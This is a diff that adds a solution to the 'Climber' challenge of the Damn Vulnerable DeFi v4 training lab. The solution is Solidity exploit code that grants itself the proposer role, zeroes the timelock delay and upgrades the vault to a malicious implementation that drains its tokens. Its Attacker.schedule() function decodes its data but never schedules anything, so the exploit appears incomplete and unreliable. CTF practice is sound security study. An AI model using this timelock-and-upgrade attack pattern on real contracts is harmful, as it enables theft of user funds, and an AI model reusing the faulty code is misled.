@@ -2,11 +2,46 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
-import {ClimberVault} from "../../src/climber/ClimberVault.sol";
-import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
-import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
-import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import { Test, console } from "forge-std/Test.sol";
+import { ClimberVault } from "../../src/climber/ClimberVault.sol";
+import { ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE } from "../../src/climber/ClimberTimelock.sol";
+import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import { DamnValuableToken } from "../../src/DamnValuableToken.sol";
+
+contract Attacker {
+    ClimberTimelock public timelock;
+    bytes public data;
+    function set(ClimberTimelock _timelock, bytes memory _data) external {
+        timelock = _timelock;
+        data = _data;
+    }
+
+    function schedule() external {
+        (
+            address[] memory targets,
+            uint256[] memory values,
+            bytes[] memory dataElements
+        ) = abi.decode(data, (address[], uint256[], bytes[]));
+    }
+}
+
+contract MaliciousImpl {
+    address immutable target;
+    DamnValuableToken immutable token;
+    constructor(address _target, DamnValuableToken _token) {
+        target = _target;
+        token = _token;
+    }
+
+    function proxiableUUID() external view returns (bytes32) {
+        return
+            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+    }
+
+    function transferAllToken() external {
+        token.transfer(target, token.balanceOf(address(this)));
+    }
+}
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -43,7 +78,10 @@ contract ClimberChallenge is Test {
             address(
                 new ERC1967Proxy(
                     address(new ClimberVault()), // implementation
-                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
+                    abi.encodeCall(
+                        ClimberVault.initialize,
+                        (deployer, proposer, sweeper)
+                    ) // initialization data
                 )
             )
         );
@@ -85,7 +123,44 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker();
+        MaliciousImpl impl = new MaliciousImpl(recovery, token);
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+
+        // upgrade implementation of vault
+        targets[0] = address(vault);
+        values[0] = 0;
+        dataElements[0] = abi.encodeCall(
+            vault.upgradeToAndCall,
+            (address(impl), abi.encodeCall(impl.transferAllToken, ()))
+        );
+
+        // update delay of timelock to 0
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
+
+        // grant proposer role to attacker
+        targets[2] = address(timelock);
+        values[2] = 0;
+        dataElements[2] = abi.encodeCall(
+            timelock.grantRole,
+            (PROPOSER_ROLE, address(attacker))
+        );
+
+        // call attacker to schedule the executions
+        targets[3] = address(attacker);
+        values[3] = 0;
+        dataElements[3] = abi.encodeCall(attacker.schedule, ());
+
+        bytes memory data = abi.encode(targets, values, dataElements);
+
+        // pass the schedule info to attacker
+        attacker.set(timelock, data);
+
+        timelock.execute(targets, values, dataElements, bytes32(0));
     }
 
     /**
@@ -93,6 +168,10 @@ contract ClimberChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
-        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            VAULT_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
     }
 }
